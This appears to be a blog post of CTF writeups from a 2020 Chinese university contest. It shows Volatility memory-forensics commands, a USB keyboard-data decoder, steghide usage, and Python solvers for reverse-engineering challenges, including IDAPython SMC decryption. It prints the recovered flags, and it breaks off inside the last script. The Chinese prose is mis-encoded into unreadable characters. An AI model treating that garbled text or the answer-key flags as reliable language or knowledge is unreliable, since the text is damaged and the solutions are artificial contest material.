<h2 id="éšè—çš„ä¿¡æ¯"><a href="#éšè—çš„ä¿¡æ¯" class="headerlink" title="éšè—çš„ä¿¡æ¯"></a>éšè—çš„ä¿¡æ¯</h2><p>æ‹¿åˆ°ä¸€ä¸ªæ®‹ç¼ºçš„äºŒç»´ç ï¼Œçœ‹è¿™ä¸ªäºŒç»´ç å¾ˆåˆ«æ‰­ï¼Œç”¨Stegsolve.jarç¿»è½¬äº†é¢œè‰²ä¹‹åï¼Œçœ‹ä¸Šå»èˆ’æœå¤šäº†ï¼Œç„¶åè¡¥å®šä½ç¬¦ï¼Œå¥ˆä½•æ‰‹æ®‹ï¼Œæ€»æ˜¯è¡¥ä¸å¥½ï¼Œäºæ˜¯æ”¾å¼ƒï¼Œç„¶åæˆ‘å†å‹ç¼©åŒ…å³å‡»äº†ä¸€ä¸‹7zè§£å‹ï¼Œæ— æ„å‘ç°è¿™ä¸ªå‹ç¼©åŒ…æ˜¯å‡å¯†ç ï¼Œæ‹¿åˆ°äº†ä¸€ä¸ªwavæ–‡ä»¶ï¼Œä½¿ç”¨ç™¾åº¦æ‰¾äº†å¥½å¤šç±»ä¼¼çš„é¢˜ï¼Œç”¨Audacityåˆ†æé¢‘è°±å‘ç°å¼€å§‹å’Œç»“æŸæœ‰é—®é¢˜ï¼ŒæŠŠéŸ³é‡è°ƒåˆ°æœ€å¤§ï¼Œå¼€å§‹çš„éƒ¨åˆ†è¿˜æ˜¯å¬ä¸åˆ°ï¼Œä½†æ˜¯æœ€åå¯ä»¥å¬å‡ºæ˜¯æ‹¨å·éŸ³ï¼Œï¼ˆçœ‹è¿‡æŸ¯å—ï¼Œä¸€ä¸‹å°±çŒœå‡ºè¿™æ˜¯è¦çŒœç”µè¯å·ç ï¼‰ï¼Œç»“åˆç™¾åº¦ï¼Œæ‰å‘ç°å’ŒDTFMæœ‰å…³ã€‚è¿™é‡Œç»™å‡ºä¸€ç¯‡å‚è€ƒæ–‡ç« ï¼š<a href="https://hebin.me/2017/09/10/è¥¿æ™®ctf-beyond/" target="_blank" rel="noopener">https://hebin.me/2017/09/10/%E8%A5%BF%E6%99%AEctf-beyond/</a></p>
<p><img src="/2020/03/11/é«˜æ ¡æˆ˜å½¹CTFéƒ¨åˆ†writeup/image-20200311153008620.png" alt="image-20200311153008620"></p>
<p>ç„¶åå¯ä»¥å¾—åˆ°ä¸€ä¸²æ•°å­—187485618521ï¼Œä½†æ˜¯æäº¤ä¸å¯¹ï¼Œæ„Ÿè§‰è¿˜æ˜¯å’Œé‚£ä¸ªäºŒç»´ç æœ‰å…³ï¼Œ</p>
<p>stringså‘½ä»¤æ‰¾åˆ°ï¼š<img src="/2020/03/11/é«˜æ ¡æˆ˜å½¹CTFéƒ¨åˆ†writeup/image-20200311153154593.png" alt="image-20200311153154593"></p>
<p>çœ‹æ¥è¦base64åŠ å¯†,æœ€åå¾—å‡ºflag{MTg3NDg1NjE4NTIx}</p>
<h2 id="ez-mem-amp-usb"><a href="#ez-mem-amp-usb" class="headerlink" title="ez_mem&amp;usb"></a>ez_mem&amp;usb</h2><p>ä»æ¥ä¸åˆ·æ‚é¡¹é¢˜ï¼Œæ‰€ä»¥éƒ½æ˜¯é ç™¾åº¦åšï¼Œæ‹¿åˆ°ä¸€ä¸ªæ•°æ®pcapæ–‡ä»¶ï¼Œåˆ†ææµé‡ï¼Œè¿‡æ»¤httpåè®®ï¼Œæ‰¾åˆ°ä¸Šä¼ çš„æ–‡ä»¶ã€‚</p>
<p><img src="/2020/03/11/é«˜æ ¡æˆ˜å½¹CTFéƒ¨åˆ†writeup/image-20200311153716210.png" alt="image-20200311153716210"></p>
<p>å‘ç°ä¸€ä¸ª40Mçš„æ•°æ®åŒ…ï¼Œé‚£è‚¯å®šä¼ æ–‡ä»¶äº†ï¼ŒæŠŠæ–‡ä»¶dumpå‡ºæ¥ï¼Œç›´æ¥è§£å‹ï¼Œå¾—åˆ°ä¸€ä¸ªvmemæ–‡ä»¶ï¼Œç™¾åº¦ä¸€æ³¢ï¼Œè¿™æ˜¯è¦å†…å­˜å–è¯ï¼ŒèŒæ–°å‚è€ƒï¼š<a href="https://www.cnblogs.com/0x4D75/p/11161822.html" target="_blank" rel="noopener">https://www.cnblogs.com/0x4D75/p/11161822.html</a></p>
<p>æ€è·¯æ˜¯ï¼Œfilescan+grepæ‰¾åˆ°å’Œflagå­—ç¬¦åŒ¹é…çš„æ–‡ä»¶ï¼Œè¿˜çœŸæœ‰ä¸€ä¸ªflag.imgï¼Œå°†flag.img dumpå‡ºæ¥ï¼Œç„¶åç›´æ¥7zè§£å‹ï¼Œéœ€è¦å¯†ç ï¼Œäºæ˜¯æ‰¾åˆ°å†…å­˜é•œåƒä¸­çš„cmdå‘½ä»¤ï¼Œæœ‰å¯†ç ç»™å‡ºã€‚</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@redhat</span><span class="symbol">:/mnt/hgfs/P/</span>é«˜æ ¡æˆ˜ç–«/misc/usbå–è¯<span class="comment"># volatility -f data.vmem --profile=WinXPSP3x86 filescan | grep flag</span></span><br><span class="line">Volatility Foundation Volatility Framework <span class="number">2.6</span></span><br><span class="line"><span class="number">0x0000000001155f90</span>      <span class="number">1</span>      <span class="number">0</span> R--rwd \Device\HarddiskVolume1\Documents <span class="keyword">and</span> Settings\Administrator\flag.img</span><br><span class="line"></span><br><span class="line">root<span class="variable">@redhat</span><span class="symbol">:/mnt/hgfs/P/</span>é«˜æ ¡æˆ˜ç–«/misc/usbå–è¯<span class="comment"># volatility -f data.vmem --profile=WinXPSP3x86 dumpfiles -Q 0x1155f90 -D ./output</span></span><br><span class="line">Volatility Foundation Volatility Framework <span class="number">2.6</span></span><br><span class="line">DataSectionObject <span class="number">0x01155f90</span>   None   \Device\HarddiskVolume1\Documents <span class="keyword">and</span> Settings\Administrator\flag.img</span><br><span class="line"></span><br><span class="line">root<span class="variable">@redhat</span><span class="symbol">:/mnt/hgfs/P/</span>é«˜æ ¡æˆ˜ç–«/misc/usbå–è¯<span class="comment"># volatility -f data.vmem --profile=WinXPSP3x86 cmdscan</span></span><br><span class="line">Volatility Foundation Volatility Framework <span class="number">2.6</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="symbol">CommandProcess:</span> csrss.exe <span class="symbol">Pid:</span> <span class="number">464</span></span><br><span class="line"><span class="symbol">CommandHistory:</span> <span class="number">0x556bb8</span> <span class="symbol">Application:</span> cmd.exe <span class="symbol">Flags:</span> Allocated, Reset</span><br><span class="line"><span class="symbol">CommandCount:</span> <span class="number">2</span> <span class="symbol">LastAdded:</span> <span class="number">1</span> <span class="symbol">LastDisplayed:</span> <span class="number">1</span></span><br><span class="line"><span class="symbol">FirstCommand:</span> <span class="number">0</span> <span class="symbol">CommandCountMax:</span> <span class="number">50</span></span><br><span class="line"><span class="symbol">ProcessHandle:</span> <span class="number">0x504</span></span><br><span class="line">Cmd <span class="comment">#0 @ 0x3609ea0: passwd:weak_auth_top100</span></span><br><span class="line">Cmd <span class="comment">#1 @ 0x5576d0: start wireshark</span></span><br><span class="line">Cmd <span class="comment">#13 @ 0x9f009f: ??</span></span><br><span class="line">Cmd <span class="comment">#41 @ 0x9f003f: ?\?????????</span></span><br></pre></td></tr></table></figure>

<p>å‹ç¼©åŒ…é‡Œæ˜¯ä¸€ä¸ªusbdataï¼ŒæŸ¥äº†ä¸€ä¸‹è¿™ä¸ªè„šæœ¬ï¼Œè§£å¯†å³å¯ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">usb_codes = &#123;</span><br><span class="line">   <span class="number">0x04</span>:<span class="string">"aA"</span>, <span class="number">0x05</span>:<span class="string">"bB"</span>, <span class="number">0x06</span>:<span class="string">"cC"</span>, <span class="number">0x07</span>:<span class="string">"dD"</span>, <span class="number">0x08</span>:<span class="string">"eE"</span>, <span class="number">0x09</span>:<span class="string">"fF"</span>,</span><br><span class="line">   <span class="number">0x0A</span>:<span class="string">"gG"</span>, <span class="number">0x0B</span>:<span class="string">"hH"</span>, <span class="number">0x0C</span>:<span class="string">"iI"</span>, <span class="number">0x0D</span>:<span class="string">"jJ"</span>, <span class="number">0x0E</span>:<span class="string">"kK"</span>, <span class="number">0x0F</span>:<span class="string">"lL"</span>,</span><br><span class="line">   <span class="number">0x10</span>:<span class="string">"mM"</span>, <span class="number">0x11</span>:<span class="string">"nN"</span>, <span class="number">0x12</span>:<span class="string">"oO"</span>, <span class="number">0x13</span>:<span class="string">"pP"</span>, <span class="number">0x14</span>:<span class="string">"qQ"</span>, <span class="number">0x15</span>:<span class="string">"rR"</span>,</span><br><span class="line">   <span class="number">0x16</span>:<span class="string">"sS"</span>, <span class="number">0x17</span>:<span class="string">"tT"</span>, <span class="number">0x18</span>:<span class="string">"uU"</span>, <span class="number">0x19</span>:<span class="string">"vV"</span>, <span class="number">0x1A</span>:<span class="string">"wW"</span>, <span class="number">0x1B</span>:<span class="string">"xX"</span>,</span><br><span class="line">   <span class="number">0x1C</span>:<span class="string">"yY"</span>, <span class="number">0x1D</span>:<span class="string">"zZ"</span>, <span class="number">0x1E</span>:<span class="string">"1!"</span>, <span class="number">0x1F</span>:<span class="string">"2@"</span>, <span class="number">0x20</span>:<span class="string">"3#"</span>, <span class="number">0x21</span>:<span class="string">"4$"</span>,</span><br><span class="line">   <span class="number">0x22</span>:<span class="string">"5%"</span>, <span class="number">0x23</span>:<span class="string">"6^"</span>, <span class="number">0x24</span>:<span class="string">"7&amp;"</span>, <span class="number">0x25</span>:<span class="string">"8*"</span>, <span class="number">0x26</span>:<span class="string">"9("</span>, <span class="number">0x27</span>:<span class="string">"0)"</span>,</span><br><span class="line">   <span class="number">0x2C</span>:<span class="string">"  "</span>, <span class="number">0x2D</span>:<span class="string">"-_"</span>, <span class="number">0x2E</span>:<span class="string">"=+"</span>, <span class="number">0x2F</span>:<span class="string">"[&#123;"</span>, <span class="number">0x30</span>:<span class="string">"]&#125;"</span>,  <span class="number">0x32</span>:<span class="string">"#~"</span>,</span><br><span class="line">   <span class="number">0x33</span>:<span class="string">";:"</span>, <span class="number">0x34</span>:<span class="string">"'\""</span>,  <span class="number">0x36</span>:<span class="string">",&lt;"</span>,  <span class="number">0x37</span>:<span class="string">".&gt;"</span>, <span class="number">0x4f</span>:<span class="string">"&gt;"</span>, <span class="number">0x50</span>:<span class="string">"&lt;"</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">key = [<span class="number">0x09</span>,<span class="number">0x0F</span>,<span class="number">0x04</span>,<span class="number">0x0A</span>,<span class="number">0x2F</span>,<span class="number">0x23</span>,<span class="number">0x26</span>,<span class="number">0x1F</span>,<span class="number">0x27</span>,<span class="number">0x27</span>,<span class="number">0x25</span>,<span class="number">0x20</span>,<span class="number">0x22</span>,<span class="number">0x24</span>,<span class="number">0x25</span>,<span class="number">0x21</span>,<span class="number">0x08</span>,<span class="number">0x06</span>,<span class="number">0x20</span>,<span class="number">0x08</span>,<span class="number">0x07</span>,<span class="number">0x25</span>,<span class="number">0x07</span>,<span class="number">0x1F</span>,<span class="number">0x04</span>,<span class="number">0x23</span>,<span class="number">0x21</span>,<span class="number">0x08</span>,<span class="number">0x24</span>,<span class="number">0x20</span>,<span class="number">0x09</span>,<span class="number">0x08</span>,<span class="number">0x26</span>,<span class="number">0x1E</span>,<span class="number">0x20</span>,<span class="number">0x06</span>,<span class="number">0x27</span>,<span class="number">0x30</span>]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(key)):</span><br><span class="line">    flag += usb_codes[key[i]][<span class="number">0</span>]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<p>flag{69200835784ec3ed8d2a64e73fe913c0}</p>
<h2 id="æ­¦æ±‰åŠ æ²¹"><a href="#æ­¦æ±‰åŠ æ²¹" class="headerlink" title="æ­¦æ±‰åŠ æ²¹"></a>æ­¦æ±‰åŠ æ²¹</h2><p>010editoræ‰“å¼€å›¾ç‰‡ï¼Œè¿™å¯çœŸæ˜¯ä¸ªå¥½ä¸œè¥¿å•Šï¼Œä¸¤ç§ä¸åŒçš„æ–‡ä»¶æ ¼å¼è¿˜åˆ†é¢œè‰²ã€‚</p>
<p><img src="/2020/03/11/é«˜æ ¡æˆ˜å½¹CTFéƒ¨åˆ†writeup/image-20200319111152938.png" alt="image-20200319111152938"></p>
<p>ç›´æ¥æ”¹åç¼€rarè§£å‹ï¼Œ</p>
<p>ç„¶åä½¿ç”¨ä¸€ä¸ªå·¥å…·çˆ†ç ´å‡ºéšè—çš„flag.txtæ–‡ä»¶ã€‚</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">å°†flag.txtæ–‡ä»¶éšè—åˆ°flag.jpgä¸­ï¼š</span><br><span class="line">steghide embed -cf flag<span class="selector-class">.jpg</span> -ef flag<span class="selector-class">.txt</span> -<span class="selector-tag">p</span> <span class="number">123456</span></span><br><span class="line"></span><br><span class="line">ä»flag.jpgè§£å‡ºflag<span class="selector-class">.txt</span>:</span><br><span class="line">steghide extract -sf flag<span class="selector-class">.jpg</span> -<span class="selector-tag">p</span> <span class="number">123456</span></span><br></pre></td></tr></table></figure>

<p>shellè„šæœ¬çˆ†ç ´å¯†ç ï¼š</p>
<p>â€¦..æ²¡æˆåŠŸï¼Œç®—äº†ï¼Œä¸è´´äº†ã€‚ã€‚</p>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="å¤©æ´¥å“"><a href="#å¤©æ´¥å“" class="headerlink" title="å¤©æ´¥å“"></a>å¤©æ´¥å“</h2><p>ä¸Šæ¥å…ˆè¿è¡Œç¨‹åºï¼Œæç¤ºç¼ºå°‘cygwin1.dllæ–‡ä»¶ï¼Œä¸‹è½½äº†ä¹‹åè¿è¡Œè¿˜æ˜¯æŠ¥é”™ï¼Œç®—äº†å§ï¼Œé™æ€åˆ†æçœ‹çœ‹ã€‚</p>
<p>æ‰¾åˆ°äº†ä¸€ä¸ªfå‡½æ•°ï¼Œä»£ç å¾ˆç®€å•ï¼Œå°±ä¸€äº›ç®€å•çš„è¿ç®—æ“ä½œã€‚</p>
<p><img src="/2020/03/11/é«˜æ ¡æˆ˜å½¹CTFéƒ¨åˆ†writeup/image-20200315160945833.png" alt="image-20200315160945833"></p>
<p>æ„Ÿè§‰æœ‰æˆï¼Œç›´æ¥å†™è„šæœ¬ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s1 = [<span class="number">0x52</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x67</span>, <span class="number">0x5f</span>, <span class="number">0x48</span>, <span class="number">0x6f</span>, <span class="number">0x70</span>, <span class="number">0x70</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0x21</span>]</span><br><span class="line">s2 = [<span class="number">17</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">20</span>, <span class="number">42</span>, <span class="number">59</span>, <span class="number">47</span>, <span class="number">3</span>, <span class="number">47</span>, <span class="number">4</span>, <span class="number">16</span>, <span class="number">72</span>, <span class="number">62</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">16</span>]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">18</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">255</span>):</span><br><span class="line">        <span class="keyword">if</span> s2[i] == (~(j &amp; s1[i % <span class="number">14</span>])) &amp; (j | s1[i % <span class="number">14</span>]):</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<p>è„šæœ¬è·‘å‡ºæ¥æ˜¯<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![image-20200315161644169](é«˜æ ¡æˆ˜å½¹CTFéƒ¨åˆ†writeup/image-20200315161644169.png)</span><br><span class="line"></span><br><span class="line">é‚£è‚¯å®šè¦åŠ¨æ€è°ƒè¯•çš„å•Šï¼Œä¸€æƒ³åˆè¿è¡Œä¸äº†ã€‚æˆ‘æŠŠå‡½æ•°éƒ½çœ‹ä¸€éçœ‹çœ‹æœ‰ä»€ä¹ˆä¿¡æ¯ã€‚</span><br><span class="line"></span><br><span class="line">![image-20200315162052676](é«˜æ ¡æˆ˜å½¹CTFéƒ¨åˆ†writeup/image-20200315162052676.png)</span><br><span class="line"></span><br><span class="line">å‘ç°è¿™é‡Œçš„Strå’Œfå‡½æ•°ä¸­çš„Stræ˜¯ä¸€ä¸ªï¼Œåˆ†æäº†ä¸€ä¸‹è¿™ä¸ªå‡½æ•°ï¼Œæ˜¯ä¸€æ®µSMC(è‡ªä¿®æ”¹ä»£ç )è¿›è¡ŒåŠ¨æ€è§£å¯†çš„ã€‚</span><br><span class="line"></span><br><span class="line">ä½¿ç”¨IDAPythonï¼š</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">flag = &quot;Caucasus@s_ability&quot;</span><br><span class="line">start = 0x10040164d</span><br><span class="line">end = start + 1045</span><br><span class="line">j = 0</span><br><span class="line">for i in range(start, end):</span><br><span class="line">    ida_bytes.patch_byte(i, ida_bytes.get_byte(i)^ ord(flag[j % 18]))</span><br><span class="line">    j += 1</span><br></pre></td></tr></table></figure></p>
<p><img src="/2020/03/11/é«˜æ ¡æˆ˜å½¹CTFéƒ¨åˆ†writeup/image-20200315162525217.png" alt="image-20200315162525217"></p>
<p>ä¹Ÿä¸æ˜¯å¾ˆå¤æ‚ã€‚ã€‚ã€‚ã€‚</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">s = [<span class="number">2007666</span>,<span class="number">2125764</span>,<span class="number">1909251</span>,<span class="number">2027349</span>,<span class="number">2421009</span>,<span class="number">1653372</span>,<span class="number">2047032</span>,<span class="number">2184813</span>,<span class="number">2302911</span>,<span class="number">2263545</span>,<span class="number">1909251</span>,<span class="number">2165130</span>,<span class="number">1968300</span>,<span class="number">2243862</span>,<span class="number">2066715</span>,<span class="number">2322594</span>,<span class="number">1987983</span>,<span class="number">2243862</span>,<span class="number">1869885</span>,<span class="number">2066715</span>,<span class="number">2263545</span>,<span class="number">1869885</span>,<span class="number">964467</span>,<span class="number">944784</span>,<span class="number">944784</span>,<span class="number">944784</span>,<span class="number">728271</span>,<span class="number">1869885</span>,<span class="number">2263545</span>,<span class="number">2283228</span>,<span class="number">2243862</span>,<span class="number">2184813</span>,<span class="number">2165130</span>,<span class="number">2027349</span>,<span class="number">1987983</span>,<span class="number">2243862</span>,<span class="number">1869885</span>,<span class="number">2283228</span>,<span class="number">2047032</span>,<span class="number">1909251</span>,<span class="number">2165130</span>,<span class="number">1869885</span>,<span class="number">2401326</span>,<span class="number">1987983</span>,<span class="number">2243862</span>,<span class="number">2184813</span>,<span class="number">885735</span>,<span class="number">2184813</span>,<span class="number">2165130</span>,<span class="number">1987983</span>,<span class="number">2460375</span>]</span><br><span class="line">print(len(s))</span><br><span class="line">v61 = <span class="number">19683</span></span><br><span class="line">v62 = <span class="number">0x8000000B</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">51</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">255</span>):</span><br><span class="line">        <span class="keyword">if</span> s[i] == v61 * j % v62:</span><br><span class="line">            flag+=chr(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<p>flag{Thousandriver_is_1000%_stronger_than_zero-one}</p>
<h2 id="cycle-graph"><a href="#cycle-graph" class="headerlink" title="cycle_graph"></a>cycle_graph</h2><p>æè¿°æ˜¯å›¾ç®—æ³•ï¼Œä¼°è®¡å‡‰äº†ï¼Œæ•°æ®ç»“æ„èœçš„ä¸€ç¬”ã€‚</p>
<p>æ‰¾åˆ°å…³é”®å‡½æ•°ï¼š</p>
<p><img src="/2020/03/11/é«˜æ ¡æˆ˜å½¹CTFéƒ¨åˆ†writeup/image-20200315163844983.png" alt="image-20200315163844983"></p>
<p>è¿™é‡Œæ˜¯å¯¹v1è¿›è¡Œåˆå§‹åŒ–ï¼Œå‡è®¾v1æ˜¯ä¸ªäºŒç»´æ•°ç»„ï¼Œæ¯ç»„æœ‰ä¸‰ä¸ªæ•°æ®ï¼Œæ ¹æ®ä»£ç å¯åˆ†æå‡ºæœ‰32ç»„ã€‚</p>
<p><img src="/2020/03/11/é«˜æ ¡æˆ˜å½¹CTFéƒ¨åˆ†writeup/image-20200315164605229.png" alt="image-20200315164605229"></p>
<p>è¿™é‡Œå°±æ˜¯ä¸»è¦ç®—æ³•ã€‚</p>
<p>ç„¶åæœ€ååˆ¤æ–­flagï¼š</p>
<p><img src="/2020/03/11/é«˜æ ¡æˆ˜å½¹CTFéƒ¨åˆ†writeup/image-20200315195856725.png" alt="image-20200315195856725"></p>
<p>åˆšå¼€å§‹æ²¡æ³¨æ„v7çš„é™åˆ¶ï¼Œç›´æ¥å†™çš„è„šæœ¬è·‘ï¼Œ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">arr_1 = [<span class="number">0x00000034</span>, <span class="number">0x00000002</span>, <span class="number">0x0000002C</span>, <span class="number">0x0000002A</span>, <span class="number">0x00000006</span>, <span class="number">0x0000002A</span>, <span class="number">0x0000002F</span>, <span class="number">0x0000002A</span>, <span class="number">0x00000033</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000032</span>, <span class="number">0x00000032</span>, <span class="number">0x00000032</span>, <span class="number">0x00000030</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000032</span>, <span class="number">0x0000002B</span>, <span class="number">0x00000002</span>, <span class="number">0x0000002E</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x0000002D</span>, <span class="number">0x00000032</span>, <span class="number">0x00000004</span>, <span class="number">0x0000002D</span>, <span class="number">0x00000030</span>, <span class="number">0x00000031</span>, <span class="number">0x0000002F</span>, <span class="number">0x00000033</span>]</span><br><span class="line">print(len(arr_1))</span><br><span class="line">arr_2 = [<span class="number">0x0000001F</span>, <span class="number">0x00000002</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000012</span>, <span class="number">0x00000007</span>, <span class="number">0x00000002</span>, <span class="number">0x0000001A</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000004</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000004</span>, <span class="number">0x00000015</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000005</span>, <span class="number">0x00000007</span>, <span class="number">0x0000001C</span>, <span class="number">0x0000000C</span>, <span class="number">0x0000001C</span>, <span class="number">0x0000000F</span>, <span class="number">0x0000000F</span>, <span class="number">0x00000002</span>, <span class="number">0x00000010</span>, <span class="number">0x00000017</span>, <span class="number">0x0000001E</span>, <span class="number">0x00000017</span>, <span class="number">0x00000013</span>, <span class="number">0x00000009</span>, <span class="number">0x00000016</span>]</span><br><span class="line">print(len(arr_2))</span><br><span class="line">arr_3 = [<span class="number">0x00000005</span>, <span class="number">0x00000001</span>, <span class="number">0x00000008</span>, <span class="number">0x00000007</span>, <span class="number">0x00000017</span>, <span class="number">0x00000009</span>, <span class="number">0x00000013</span>, <span class="number">0x0000001F</span>, <span class="number">0x00000017</span>, <span class="number">0x00000009</span>, <span class="number">0x0000000D</span>, <span class="number">0x0000000C</span>, <span class="number">0x0000001D</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000018</span>, <span class="number">0x00000009</span>, <span class="number">0x00000018</span>, <span class="number">0x00000019</span>, <span class="number">0x00000009</span>, <span class="number">0x0000001A</span>, <span class="number">0x00000003</span>, <span class="number">0x00000016</span>, <span class="number">0x00000006</span>, <span class="number">0x00000011</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000007</span>, <span class="number">0x0000000F</span>, <span class="number">0x00000014</span>, <span class="number">0x00000001</span>, <span class="number">0x00000010</span>, <span class="number">0x00000004</span>, <span class="number">0x0000000B</span>]</span><br><span class="line"></span><br><span class="line">v1 = [[<span class="number">0</span>] * <span class="number">3</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">31</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">31</span>):</span><br><span class="line">    v1[i][<span class="number">0</span>] = arr_1[i]</span><br><span class="line">    v1[i][<span class="number">1</span>] = arr_2[i+<span class="number">1</span>]</span><br><span class="line">    v1[i][<span class="number">2</span>] = arr_3[i+<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">print(v1)</span><br><span class="line"></span><br><span class="line">str1 = string.printable</span><br><span class="line">print(str1)</span><br><span class="line"></span><br><span class="line">v5 = <span class="number">48</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">ii = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str1:</span><br><span class="line">        <span class="keyword">if</span> v1[ii][<span class="number">0</span>] + v5 == ord(j):</span><br><span class="line">            flag += j</span><br><span class="line">            ii = v1[ii][<span class="number">1</span>]</span><br><span class="line">            v5 = ord(j)</span><br><span class="line">            print(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> v5 - v1[ii][<span class="number">0</span>] == ord(j):</span><br><span class="line">            flag += j</span><br><span class="line">            ii = v1[ii][<span class="number">2</span>]</span><br><span class="line">            v5 = ord(j)</span><br><span class="line">            print(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<p>è·‘å‡ºæ¥<code>d8b0bae8jh52db/2</code>,æäº¤å½“ç„¶ä¸å¯¹ï¼Œåæ¥çœ‹åˆ°äº†v7çš„é™åˆ¶ã€‚ä¸ºä»€ä¹ˆv7ä¼šå‡ºç°å·®å¼‚å‘¢ï¼Ÿ å› ä¸ºæœ‰æ—¶å€™åŠ v5å’Œå‡v5éƒ½æ»¡è¶³ï¼Œä¸çŸ¥é“èµ°å“ªæ¡è·¯å¾„ã€‚ä¼°è®¡å¾—ç”¨æŸä¸ªç®—æ³•è§£ï¼Œæ¯”å®Œèµ›å†å­¦ä¸€ä¸‹ç®—æ³•ï¼Œæ‰€ä»¥æˆ‘æ‰‹åŠ¨æ­£ç€åŠ å€’ç€ï¼Œç¡¬æ˜¯ç»™å†™å‡ºæ¥äº†ã€‚</p>
<p><img src="/2020/03/11/é«˜æ ¡æˆ˜å½¹CTFéƒ¨åˆ†writeup/image-20200315170104295.png" alt="image-20200315170104295"></p>
<p><img src="/2020/03/11/é«˜æ ¡æˆ˜å½¹CTFéƒ¨åˆ†writeup/image-20200315170118029.png" alt="image-20200315170118029"></p>
<p>æ»¡æ»¡çš„èœå•Šâ€¦â€¦.</p>
<p>æ­¤å¤„å¯ç”¨å¹¿åº¦ä¼˜å…ˆæœç´¢ç®—æ³•ï¼Œç®—æ³•å­¦ä¹ å…·ä½“å‚è€ƒ<a href="https://blog.csdn.net/raphealguo/article/details/7523411" target="_blank" rel="noopener">https://blog.csdn.net/raphealguo/article/details/7523411</a></p>
<h2 id="easyparser"><a href="#easyparser" class="headerlink" title="easyparser"></a>easyparser</h2><p>è¿™ä¸ªé¢˜ï¼Œæˆ‘å¯æ˜¯ç‰¹åˆ«è‚çš„ï¼ŒçŸ¥é“æ˜¯è™šæ‹Ÿæœºï¼Œä½†æ˜¯æˆ‘ä¹Ÿæ²¡é‡åˆ°è¿‡è¿™ç§é¢˜ï¼Œç›´æ¥åŠ¨æ€è°ƒè¯•ï¼Œæˆ‘ä¸€æ­¥ä¸€æ­¥è·Ÿå‡ºæ¥çš„ç¨‹åºé€»è¾‘ï¼Œè¿˜å¥½ä¸æ˜¯ç‰¹åˆ«å¤æ‚ï¼Œä¹Ÿå°±è°ƒäº†6ä¸ªå°æ—¶å·¦å³å§ã€‚ã€‚ã€‚ã€‚å…ˆç»™å‡ºè§£å¯†è„šæœ¬ï¼Œç„¶åå†å­¦ä¹ ä¸€ä¸‹æ­£ç¡®çš„è§£æ³•ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = [<span class="number">144</span>, <span class="number">332</span>, <span class="number">28</span>, <span class="number">240</span>, <span class="number">132</span>, <span class="number">60</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">240</span>, <span class="number">208</span>, <span class="number">88</span>, <span class="number">44</span>, <span class="number">8</span>, <span class="number">52</span>, <span class="number">240</span>, <span class="number">276</span>, <span class="number">240</span>, <span class="number">128</span>, <span class="number">44</span>, <span class="number">40</span>, <span class="number">52</span>, <span class="number">8</span>, <span class="number">240</span>, <span class="number">144</span>, <span class="number">68</span>, <span class="number">48</span>, <span class="number">80</span>, <span class="number">92</span>, <span class="number">44</span>, <span class="number">264</span>, <span class="number">240</span>]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x20</span>):</span><br><span class="line">    flag += 